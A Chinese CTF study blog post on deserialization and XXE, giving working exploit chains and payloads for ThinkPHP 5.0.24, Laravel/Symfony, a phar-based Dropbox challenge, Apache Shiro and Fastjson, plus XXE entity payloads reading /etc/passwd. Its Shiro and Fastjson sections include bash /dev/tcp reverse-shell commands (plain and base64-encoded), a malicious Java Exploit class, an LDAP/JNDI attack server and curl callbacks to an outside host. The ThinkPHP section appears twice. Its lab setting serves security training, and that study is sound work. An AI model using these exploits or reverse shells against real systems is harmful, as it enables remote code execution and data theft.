1http://10.20.25.44:580/?a=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czoyOiJiYiI7czo4OiJnZXRFcnJvciI7fXM6ODoiACoAZXJyb3IiO086MzA6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEJlbG9uZ3NUbyI6MTp7czo4OiIAKgBxdWVyeSI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjE2OiJyZW1vdmVXaGVyZUZpZWxkIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjE6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6NjoiACoAdGFnIjtiOjE7czoxMDoiACoAb3B0aW9ucyI7YToyOntzOjY6ImV4cGlyZSI7aTowO3M6NjoicHJlZml4IjtzOjM1OiJQRDl3YUhBS1pYWmhiQ2drWDBkRlZGc25ZU2RkS1RzS1B6NCI7fXM6MTA6IgAqAGhhbmRsZXIiO086MjM6InRoaW5rXGNhY2hlXGRyaXZlclxGaWxlIjoyOntzOjY6IgAqAHRhZyI7YjowO3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MzYwMDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDtzOjQ6InBhdGgiO3M6NDY6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9Li8iO319fX19fX19fQ== 访问http://10.20.25.44:580/8fba8bb6410a4aee90b063a8b7e78b73.php?a=system(&#39;cat /f*&#39;);得到flag 另一个poc： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php//File类namespace think\cache\driver;class File &#123; // tag变量跟文件名有关 protected $tag='abcdef'; protected $options = [ 'expire' =&gt; 3600, 'cache_subdir' =&gt; false, 'prefix' =&gt; '', // 写入文件 'path' =&gt; 'php://filter//convert.iconv.UCS-2LE.UCS-2BE/resource=.//static/?&lt;hp pvela$(P_SO[T]x;)&gt;?/../', // 创建子目录// 'path' =&gt; './static/runtime/', 'data_compress' =&gt; false, ];&#125;//Memcached类namespace think\session\driver;use think\cache\driver\File;class Memcached &#123; protected $handler = null; function __construct() &#123; $this-&gt;handler=new File(); &#125;&#125;//Output类namespace think\console;use think\session\driver\Memcached;class Output &#123; protected $styles = ['removeWhereField']; private $handle = null; function __construct() &#123; $this-&gt;handle=new Memcached(); &#125;&#125;//HasOne类namespace think\model\relation;use think\console\Output;class HasOne &#123; protected $query = false; function __construct() &#123; $this-&gt;query=new Output(); &#125;&#125;//Pivot类namespace think\model;use think\model\relation\HasOne;class Pivot &#123; protected $append = ['getError']; protected $error = false; public function __construct() &#123; $this-&gt;error=new HasOne(); &#125;&#125;//Windows类namespace think\process\pipes;use think\model\Pivot;class Windows &#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;$x=new Windows();echo base64_encode(serialize($x));var_dump(iconv("UCS-2BE", "UCS-2LE", '&lt;?php eval($_POST[x]);?&gt;')); [CISCN2019 总决赛 Day1 Web4]Laravel1题目转载：https://my.oschina.net/u/4258824/blog/3398614 首先全局搜索__destruct这样的魔术方法 看看本类中有没有可控的命令执行命令，如果没有就找有没有那个方法可以调用其他类 然后全局搜索能利用的可控函数 题目：http://10.20.25.44:581/ laravel，构造 rop 拿到 /flag 内容 POC 1234567891011121314151617181920212223242526&lt;?phpnamespace Symfony\Component\Cache&#123; final class CacheItem&#123; &#125;&#125;namespace Symfony\Component\Cache\Adapter&#123; use Symfony\Component\Cache\CacheItem; class PhpArrayAdapter&#123; private $file; public function __construct() &#123; $this-&gt;file = '/flag'; //这里是要访问的目录/etc/passwd &#125; &#125; class TagAwareAdapter&#123; private $deferred = []; private $pool; public function __construct() &#123; $this-&gt;deferred = array('aaa' =&gt; new CacheItem()); $this-&gt;pool = new PhpArrayAdapter(); &#125; &#125; $obj = new TagAwareAdapter(); echo urlencode(serialize($obj));&#125; 注意这里GET的参数是payloadpayload 1http://10.20.25.44:581/?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bs%3A3%3A%22aaa%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A0%3A%7B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%22%3A1%3A%7Bs%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%00file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D Java反序列化漏洞Java语言概述Java是一种广泛使用的计算机编程语言，拥有跨平台、面向对象、泛型编程的特性，广泛应用于企业级Web应用开发和移动应用开发。 Java编程语言的风格十分接近C++语言。继承了C++语言面向对象技术的核心，舍弃了容易引起错误的指针，以引用取代；移除了C++中的运算符重载和多重继承特性，用接口取代；增加垃圾回收器功能。在JavaSE1.5版本中引入了泛型编程、类型安全的枚举、不定长参数和自动装/拆箱特性。 一句话：取其精华，弃其糟粕。 Java中的序列化与反序列化Java 序列化是指把 Java 对象转换为字节序列的过程ObjectOutputStream类的 writeObject() 方法可以实现序列化 Java 反序列化是指把字节序列恢复为 Java 对象的过程ObjectInputStream 类的 readObject() 方法用于反序列化。 实现java.io.Serializable接口才可被反序列化，而且所有属性必须是可序列化的(用transient关键字修饰的属性除外，不参与序列化过程) Step1:定义一个类123456789101112131415class DASCTF implements Serializable &#123; private static final long serialVersionUID = 1L; //序列化版本号 private String name; public DASCTF(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; Step2:定义一个DASCTF的类对象12345public class Main &#123; public static void main(String[] args)&#123; DASCTF dasctf = new DASCTF( name:"anheng") &#125;&#125; Step3:将其序列化之后写出到文件123456try&#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(name:"object.txt)); oos.writeObject(dasctf);&#125; catch (IOException e)&#123; e.printStackTrace();&#125; Step4:将其从文件中读出再做反序列化，并获取其中的name输出123456789try&#123; ObjectOutputStream ois = new ObjectInputStream(new FileInputStream(name:"object.txt)); DASCTF dasctf1 = (DASCTF) ois.readObject(); System.out.println(dasctf1.getName());&#125; catch (IOException e)&#123; e.printStackTrace();&#125; catch (ClassNotFoundException e)&#123; e.printStackTrace();&#125; 序列化版本号12345678910111213141516class DASCTF1 implements Serializable &#123; private static final long serialVersionUID = 1L; //序列化版本号 private String name; public DASCTF(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; 使用十六进制编辑器打开生成的Object.txt进行序列化数据观察 123456789101112131415161718192021ACED--幻数0005–Java序列化版本号73–定义新对象72–开始类的描述0006–类名长度（字节数）444153435446--类名（DASCTF）0000000000000001–类序列化版本号02–标识类实现了Serializable0001–类的属性个数（1个）4C–对象（TypeCode=‘L‘，引用类型）0004–字段名长度6E616D65–字段名数据（name）74–TC_STRING0012–字段名长度4C6A6176612F6C616E672F537472696E673B--Ljava/lang/String;78–数据块结束70--TC_NULL，输出了一个NULL数据，告知结束，需要开始输出具体数据74–引用类型，TC_STRING，下面为String数据0006–String长度6字节676C7A6A696E--glzjin Java中的相关函数1. readObject()方法 readObject 被重写的话，在反序列化时会被调用 2. 反射创建类对象与调用方法 3. 反射调用 Runtime exec 执行命令 反射机制在 Java 中： 对于任意一个类： 都能够得到这个类的所有属性和方法。 对于任意一个对象： 都能够获得这个对象所有属性以及调用这个对象的任意方法。 这种动态获取类/对象信息以及动态调用方法的功能叫做 Java 的反射机制。 Java 反序列化漏洞-关键点 找到 反序列化数据输入点 找到 反射调用任意类的点 找到 从输入点到反射点的链条 JAVA Apache-CommonsCollections3.1 反序列化RCE漏洞分析该漏洞组件下载地址https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1 转载：https://xz.aliyun.com/t/6787#toc-10 JDK1.8+中禁止了链条某些类被反序列化，有一套Java反序列化Payload收集以及生成工具，利用其中CommonsCollections5/6/7即可在高版本中进行反序列化。 地址：https://github.com/frohoff/ysoserial Java反序列化漏洞的反序列化点除了链条和反射点，我们还要有反序列化点。常出现在： 123456- HTTP参数中 - Cookie：Shiro- RMI协议：Java远程方法调用，在RMI中传输的数据皆为序列化- JMX：一个为应用程序植入管理功能的框架- 自定义协议：用来接收与发送原始的java对象 - Dubbo 反序列化漏洞实战PHP反序列化漏洞ThinkPHP V5.0.24反序列化漏洞代码包：https://wws.lanzous.com/ij0LMfcld0b ThinkPHP 5.0.24 反序列化RCE （Windows下EXP）转载：https://www.cnblogs.com/xiaozhiru/p/12452528.html 运行POC后会生成payload： 1http://10.20.25.44:580/?a=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czoyOiJiYiI7czo4OiJnZXRFcnJvciI7fXM6ODoiACoAZXJyb3IiO086MzA6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEJlbG9uZ3NUbyI6MTp7czo4OiIAKgBxdWVyeSI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjE2OiJyZW1vdmVXaGVyZUZpZWxkIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjE6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6NjoiACoAdGFnIjtiOjE7czoxMDoiACoAb3B0aW9ucyI7YToyOntzOjY6ImV4cGlyZSI7aTowO3M6NjoicHJlZml4IjtzOjM1OiJQRDl3YUhBS1pYWmhiQ2drWDBkRlZGc25ZU2RkS1RzS1B6NCI7fXM6MTA6IgAqAGhhbmRsZXIiO086MjM6InRoaW5rXGNhY2hlXGRyaXZlclxGaWxlIjoyOntzOjY6IgAqAHRhZyI7YjowO3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MzYwMDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDtzOjQ6InBhdGgiO3M6NDY6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9Li8iO319fX19fX19fQ== 访问http://10.20.25.44:580/8fba8bb6410a4aee90b063a8b7e78b73.php?a=system(&#39;cat /f*&#39;);得到flag 另一个poc： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php//File类namespace think\cache\driver;class File &#123; // tag变量跟文件名有关 protected $tag='abcdef'; protected $options = [ 'expire' =&gt; 3600, 'cache_subdir' =&gt; false, 'prefix' =&gt; '', // 写入文件 'path' =&gt; 'php://filter//convert.iconv.UCS-2LE.UCS-2BE/resource=.//static/?&lt;hp pvela$(P_SO[T]x;)&gt;?/../', // 创建子目录// 'path' =&gt; './static/runtime/', 'data_compress' =&gt; false, ];&#125;//Memcached类namespace think\session\driver;use think\cache\driver\File;class Memcached &#123; protected $handler = null; function __construct() &#123; $this-&gt;handler=new File(); &#125;&#125;//Output类namespace think\console;use think\session\driver\Memcached;class Output &#123; protected $styles = ['removeWhereField']; private $handle = null; function __construct() &#123; $this-&gt;handle=new Memcached(); &#125;&#125;//HasOne类namespace think\model\relation;use think\console\Output;class HasOne &#123; protected $query = false; function __construct() &#123; $this-&gt;query=new Output(); &#125;&#125;//Pivot类namespace think\model;use think\model\relation\HasOne;class Pivot &#123; protected $append = ['getError']; protected $error = false; public function __construct() &#123; $this-&gt;error=new HasOne(); &#125;&#125;//Windows类namespace think\process\pipes;use think\model\Pivot;class Windows &#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;$x=new Windows();echo base64_encode(serialize($x));var_dump(iconv("UCS-2BE", "UCS-2LE", '&lt;?php eval($_POST[x]);?&gt;')); [CISCN2019 总决赛 Day1 Web4]Laravel1题目转载：https://my.oschina.net/u/4258824/blog/3398614 首先全局搜索__destruct这样的魔术方法 看看本类中有没有可控的命令执行命令，如果没有就找有没有那个方法可以调用其他类 然后全局搜索能利用的可控函数 题目：http://10.20.25.44:581/ laravel，构造 rop 拿到 /flag 内容 POC 1234567891011121314151617181920212223242526&lt;?phpnamespace Symfony\Component\Cache&#123; final class CacheItem&#123; &#125;&#125;namespace Symfony\Component\Cache\Adapter&#123; use Symfony\Component\Cache\CacheItem; class PhpArrayAdapter&#123; private $file; public function __construct() &#123; $this-&gt;file = '/flag'; //这里是要访问的目录/etc/passwd &#125; &#125; class TagAwareAdapter&#123; private $deferred = []; private $pool; public function __construct() &#123; $this-&gt;deferred = array('aaa' =&gt; new CacheItem()); $this-&gt;pool = new PhpArrayAdapter(); &#125; &#125; $obj = new TagAwareAdapter(); echo urlencode(serialize($obj));&#125; 注意这里GET的参数是payloadpayload 1http://10.20.25.44:581/?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bs%3A3%3A%22aaa%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A0%3A%7B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%22%3A1%3A%7Bs%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%00file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D Phar 触发反序列化BUUCTF 上 Web 分类的 [CISCN2019 华北赛区 Day1 Web1]Dropbox 本题主要考察目录穿越读取源码以及 使用 phar 触发 php 反序列化。 打开是这样一个靶机。 注册之后登录，是个网盘系统，可以上传下载 png 等图片文件。 抓包看看下载的包，看到里面传入文件名给 /download.php 进行下载。 尝试篡改 filename 这个参数进行路径穿越，可以路径穿越下载到网站源码。 抓包分析网站上各种请求的url，分别得到有如下的路径。 /index.php 网站首页 /download.php 下载文件 /login.php 登录请求 /upload.php 上传文件 /class.php 类定义文件，通过查看 upload.php 得到 /delete.php 删除文件 通过路径穿越把他们都下载下来，在本地用 phpstorm 创建一个项目查看。 看到这个 class.php，里面有三个类 User, FileList，File。 看到里面有两个类有高危的魔术方法 __destruct。FileList 的 __destruct 无法利用，因为里面只是单纯的做了一个输出，对我们来说意义并不大。 然后看到 User 的 __destruct，里面有调用 db 属性的 close 方法。 看看程序中有哪个类有定义 close。 File 类中有定义，但其只是做了一个调用没有输出。所以我们还要想个办法进行输出。 同时看到在 FileList 中看到有定义 __call ，则代表其所有没被定义的方法被调用时都会调用这个魔术方法。 看到这个魔术方法被调用之后会挨个调用 files 中的对象的相应同名方法，并把结果存储到结果中。 同时 FileList 又有析构方法，其在对象被销毁时会被调用。在其中对结果数组做了输出。 所以我们的反序列链条就出来了。首先定义一个 User 类对象，让其中的 db 为 FileList 类对象，User被销毁时会去调用 db 的 close 方法。调用到 FileList 的 close 之后由于其没有定义 close 方法，则会调用到 __call 魔术方法，这里调用之后就会调用 files 中 file 所指代的对象的同名方法，file 这里我们让他指向 File 类的类对象，触发其中的 close 返回文件内容。，调用完成之后把结果存上。最后在 FileList 对象被销毁的时候就会输出这些结果。 链条有了，我们的反序列化点在哪呢？直接搜索 unserialize 并没有搜到，所以我们需要用文件操作 + phar 的方式触发反序列化。 看到 download.php 里有限制 open_basedir，这里我们没法利用来读取根目录下的 flag 文件。 看到 delete 里没有限制，所以这里这个文件操作点我们可以利用，在这里将 filename 传入 phar 伪协议来触发反序列化。 构造 phar 文件的程序如下： 123456789101112131415161718192021222324252627282930313233&lt;?phpclass User &#123; public $db; /** * User constructor. */ public function __construct() &#123; $this-&gt;db = new FileList(); &#125;&#125;class FileList &#123; private $files; private $results=array(); private $funcs=array(); /** * FileList constructor. */ public function __construct() &#123; $this-&gt;files=array(new File()); &#125;&#125;class File &#123; public $filename="/flag.txt";&#125;$phar = new Phar("phar.phar");$phar-&gt;startBuffering();$phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;");$o = new User();$phar-&gt;setMetadata($o);$phar-&gt;addFromString("test.txt", "aaaa");$phar-&gt;stopBuffering(); 39 行的 “GIF89a” 则是为了给上次的文件添加文件头绕过检测。 构造完成之后，把生成的 phar 文件的扩展名改成 gif 再上传。 最后抓删除文件的包，将文件名参数改为 phar 伪协议，触发反序列化，读到 flag。 Java 反序列化漏洞Java反序列化—Shiro相关工具使用和探究给到的是 Shiro 1.2.4 的一个靶机: http://10.20.25.44:780/login 打开网站，看到是一个登录界面。 这里有提示这个网站是有用到 shiro 组件的，所以可以利用网上的工具来直接试试。 搜工具首选 GitHub 这里搜索到 ShiroScan这个工具，可以尝试利用他来攻击一下这个网站试试 https://github.com/sv3nbeast/ShiroScan 1python3 shiro_rce.py 'http://10.20.25.44:780/' 'curl http://http.requestbin.buuoj.cn/y0u7dvy0' 然后就可以接收到请求，说明命令成功执行了： 然后接下来反弹一个 shell 试试，你会发现直接用管道符命令来反弹 shell并不行。 1python3 shiro_rce.py 'http://10.20.25.44:780/' 'bash -i &gt;&amp; /dev/tcp/10.11.33.142/8888 0&gt;&amp;1' 因为 java 中 Runtime.getRuntime().exec() 中执行命令并不是直接调用 sh，而是自己尝试解析命令然后执行，如果我们插入某些符号则会扰乱判断，造成命令失败。 那还有什么方式来利用管道符反弹 shell 呢？ 所以先尝试把命令编码成 base64，然后在这里执行命令的时候先 base64 解码然后再执行，是不是就可以绕过上面的符号扰乱呢？ 1python3 shiro_rce.py 'http://10.20.25.44:780/' 'bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjIwLjI0LjI0MS84ODg4IDA+JjEK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;' 这里就是解码然后执行。 然后反弹 shell 成功，拿到 flag。 Java 反序列化—Fastjson 相关Payload使用和探究首先给到靶机地址， http://10.20.25.44:781/test/test，打开 405 请求方式不允许，则尝试POST 上去，又提示媒体类型不存在 fuzz 一下 content-type 发现json 可以。 知道是 fastjson 了，想到用 fastjson 的相关 payload 打一打，而 fastjson 最重要的点就是它的 autoType，所以在这里尝试用 autoType 的 payload 打一打看看。 https://paper.seebug.org/1192/ 如何测试这些 payload 呢？看一下只要这些 payload 能不能发送数据到你自己这儿就可以判断了。比如这个 payload。 他要是能用，那是不是就能发送数据到这个地址上面呢？ 我们一个个来试试，试到这个可以： https://paper.seebug.org/1192/#ver1225ver1241 使用 nc 开启 1389端口的监听： 1nc -lv 1389 然后在本地启动一个恶意的 ldap服务器进行攻击。 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://10.20.24.241:8887/#Exploit 下载 10.20.24.241:8887 上的恶意类 Exploit，下载 Exploit.class。 来构造一下恶意类。 1234567891011121314public class Exploit &#123; public Exploit()&#123; try &#123; // Runtime.getRuntime().exec("calc"); java.lang.Runtime.getRuntime().exec( new String[]&#123;"bash", "-c", "curl http://http.requestbin.buuoj.cn/18jehhb1"&#125;); &#125; catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; Exploit e = new Exploit(); &#125;&#125; javac 编译一下。注意需要使用 JDK8。 1javac Exploit.java 然后还需要在本地启动一个 web 服务器监听 8887 端口来发送恶意类。 1php -S 0.0.0.0:8887 -t ./ 最后发送 payload，触发 靶机 -&gt; 本地 ldap -&gt; 本地恶意类 的读取，从而执行恶意类。 1234567&#123; "rand1": &#123; "@type": "Lcom.sun.rowset.JdbcRowSetImpl;", "dataSourceName": "ldap://10.20.24.241:1389/Object", "autoCommit": true &#125;&#125; 可以看到成功执行 curl，请求到我们的 requestbin 上面。 反弹 shell 也同理: 1234567891011121314public class Exploit &#123; public Exploit()&#123; try &#123; // Runtime.getRuntime().exec("calc"); java.lang.Runtime.getRuntime().exec( new String[]&#123;"bash","-c","&#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjIwLjI0LjI0MS84ODg4IDA+JjEK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"&#125;); &#125; catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; Exploit e = new Exploit(); &#125;&#125; 以上整理自 赵今 师傅的 WriteUp 特此鸣谢 如何挖掘自己的php反序列化链转载自：https://xz.aliyun.com/t/8082 简单介绍在使用php的反序列化漏洞前需要两个条件 可以进行反序列化的点 合理的 pop chain 这一对组合拳形成的反序列化漏洞可以进而造成 RCE、文件读写、信息泄露等危害 总则挖链的途中总结出以下两点： 1. 变量可控 在危险的函数和结构上的可控变量要尽可能的多 2. 扩大影响 尽可能的去寻找可以扩大攻击面的结构与方法 接下来的pop chain构造便一直基于这两点 寻找起点序列化是将对象的属性进行格式的转换，但不会包括方法。所以如果想要反序列化达成恶意的操作必须需要方法的执行。 对于起点来说，要找到可以自动调用的方法。常见的可以自动调用的方法便是魔术方法。 目前只有两个魔术方法可以被使用 1. __destruct2. __wakeup 其中，最为常用的魔术方法是 __destruct，其特性是对象被销毁前被调用。从系统结构的角度讲，其最常见的场景是关闭某些功能。比如关闭文件流，更新数据等。但从反序列化的角度讲，其特殊的使用场景，代表在这个方法内可能会调用类内的其它方法。 而另一个 __wakeup方法就不太常用了，其特性是反序列化时进行调用。那么可以想象开发人员在对其进行编写时，可能会将其作为一个进行反序列化时属性合法性校验的方法。 最经典的就是 GuzzleHttp 包中的 GuzzleHttp \ Psr7 \ FnStream 类，其内部存在大量变量可控的危险函数。但以下这一个方法就直接避免了这个方法被恶意使用。 1234public function __wakeup()&#123; throw new \LogicException('FnStream should never be unserialized');&#125; 当然也不是没有使用了 __wakeup的链，只不过从各个方面来讲，__destruct 确实更好用一些。 接下来再看一个例子。 phpggc 是github上的一个项目，其存储着大量反序列化链，可以说是反序列化的武器库。 其存储了大量的 laravel 框架的 RCE反序列化链，仔细观察发现一共6条反序列化链，5条都使用了同一个类作为起点，还有一条也间接调用了此类。其便是PendingBroadcast.php下的 __destruct方法 1234public function __destruct()&#123; $this-&gt;events-&gt;dispatch($this-&gt;event);&#125; 三个特点： 1. 可自动调用2. 参数可控3. 攻击面广 自动调用自然不必多说，__destruct方法嘛。但值得注意的是其参数和结构。 我们可以看到$this-&gt;events和$this-&gt;event都是可控的，这意味着我们的链可以有两条走向。 其一是将 $this-&gt;events 赋值为没有 dispatch 方法的实例，来调用其 __call方法。其二是去调用各种类中 dispatch 方法，如果有的 dispatch 中有危险的函数或者结构，那就考虑使用它。 这样就大幅扩大了我们的攻击面。 跳板挑选 所谓的跳板，就是在方法和方法、结构和结构、方法和结构之间的跳跃。 常见的例子是一些字符串函数，例如 trim，如果其参数可控，我们将其赋值为存在 __toString方法的对象即可调用这个方法。 还有类似于 call_user_func($this-&gt;test); 或者 $test(); 这种只能调用没有参数的函数的结构。出来简单的调用 phpinfo 以外，我们也可以考虑将变量赋值为[(new test), &quot;aaa&quot;]这样的一个数组。就可以调用test类中的aaa公共方法。 再者，就是 new $test1($test2, $test3); 这样的结构也可以调用 __construct方法。或者像 RCTF2020-swoole 一题一样，新建一个PDO对象来进行mysql的load file。 总之，就是不计一切代价扩大链的可能性，为寻找到可以利用的方法提供机会。 终点终点在我看来有两类 1. 危险动态调用2. 危险函数 动态调用就是像($this-&gt;a)($this-&gt;b)或者$this-&gt;a[0]($this-&gt;b)这样的危险动态调用。 危险函数，就是根据目的寻找需要的函数。如要RCE，则寻找类似于call_user_func，array_walk这样的会进行函数调用的函数。如要FW，则寻找file_put_content这样的函数。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE 漏洞]]></title>
    <url>%2F%2F2020%2F08%2Fb4627abb.html</url>
    <content type="text"><![CDATA[XXE 漏洞XML外部实体注入 / XXE(XMLExternalEntityInjection)漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载。通过XML实体的SYSTEM关键词导致XML解析器可以从本地文件或者远程URI中读取数据。所以攻击者可以通过XML实体传递自己构造的恶意值，使得处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 XXE漏洞概述什么是XML可扩展标记语言（英语：ExtensibleMarkupLanguage，简称：XML）是一种标记语言。用途：传送数据信息（描述数据是什么，以及携带数据信息）。例子： 1234567&lt;?xmlversion=“1.0”?&gt;&lt;note&gt;&lt;to&gt;王富贵&lt;/to&gt;&lt;from&gt;李小花&lt;/from&gt;&lt;heading&gt;问候&lt;/heading&gt;&lt;body&gt;今天学习XML了吗？&lt;/body&gt;&lt;/note&gt; 形象化一点： 1234567&lt;?xmlversion=“1.0”?&gt;//XML声明&lt;小纸条&gt;//文档元素&lt;收件人&gt;王富贵&lt;/收件人&gt;//子结点&lt;发件人&gt;李小花&lt;/发件人&gt;&lt;主题&gt;问候&lt;/主题&gt;&lt;具体内容&gt;今天学习XML了吗？&lt;/具体内容&gt;&lt;/小纸条&gt; 什么是DTDDTD全称 document type definition，作用是定义XML文档的合法构建模块。 XML DTD就像是所使用的标签的定义文档，并且由 XML 设计者或作者开发。DTD 定义了存在什么标签，它们拥有什么属性，以及其它元素里面有什么元素等等。 基本语法 &lt;!ELEMENT 元素名 类型&gt;下面是 DTD 文件的样子： 内部定义 1234567&lt;!DOCTYPE note[ &lt;!ELEMENT note(to,from,heading,body)&gt; &lt;!ELEMENT to(#) (#PCDATA)&gt; &lt;!ELEMENT from(#) (#PCDATA)&gt; &lt;!ELEMENT heading(#) (#PCDATA)&gt; &lt;!ELEMENT body(#) (#PCDATA)&gt; ]&gt; 外部定义： 这里可控可以命令执行 1&lt;!DOCTYPE note SYSTEM “note.dtd”&gt; note.dtd内容： 12345&lt;!ELEMENT note(to,from,heading,body)&gt;&lt;!ELEMENT to(#) (#PCDATA)&gt;&lt;!ELEMENT from(#) (#PCDATA)&gt;&lt;!ELEMENT heading(#) (#PCDATA)&gt;&lt;!ELEMENT body(#) (#PCDATA)&gt; DTD 可以包含在 XML 文档内。XML的第一行必须是&lt;!DOCTYPE&gt;元素。同时也可以外部引用。 一个完整的XML例子1234567891011121314&lt;?xmlversion=“1.0”?&gt; //XML声明&lt;!DOCTYPE note[&lt;!ELEMENT note(to,from,heading,body)&gt; //文档类型定义/DTD&lt;!ELEMENT to(#) (#PCDATA)&gt;&lt;!ELEMENT from(#) (#PCDATA)&gt;&lt;!ELEMENT heading(#) (#PCDATA)&gt;&lt;!ELEMENT body(#) (#PCDATA)&gt;]&gt;&lt;note&gt; //文档元素&lt;to&gt;王富贵&lt;/to&gt; //子结点&lt;from&gt;李小花&lt;/from&gt;&lt;heading&gt;问候&lt;/heading&gt;&lt;body&gt;今天学习XML了吗？&lt;/body&gt;&lt;/note&gt; 何谓XXEXXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。 如何构造实体注入直接通过DTD外部实体声明 1234567&lt;?xmlversion="1.0"?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY b SYSTEM"file:///etc/passwd"&gt; ]&gt;&lt;root&gt; &lt;name&gt;&amp;b;&lt;/name&gt;&lt;/root&gt; 通过DTD文档引入外部DTD文档，再引入外部实体声明 payload： 1234567&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a[&lt;!ENTITY %d SYSTEM "http://192.168.31.177:8890/test.dtd"&gt; %d;]&gt;&lt;root&gt; &lt;name&gt;&amp;b;&lt;/name&gt;&lt;/root&gt; test.dtd: 1&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt; XXE漏洞探测技巧如何确认XXE漏洞存在通过注入外部实体。观察程序是如何传输数据的 bp抓包在HTTP请求头中检查conetent-type是否为xml 通过注入外部实体。尝试插入外部实体，观察回显。 123456&lt;?xmlversion="1.0"?&gt;&lt;!DOCTYPEa[&lt;!ENTITYb"DASCTF"&gt;]&gt;&lt;root&gt; &lt;username&gt;&amp;b;&lt;/username&gt; &lt;password&gt;&amp;b;&lt;/password&gt;&lt;/root&gt; 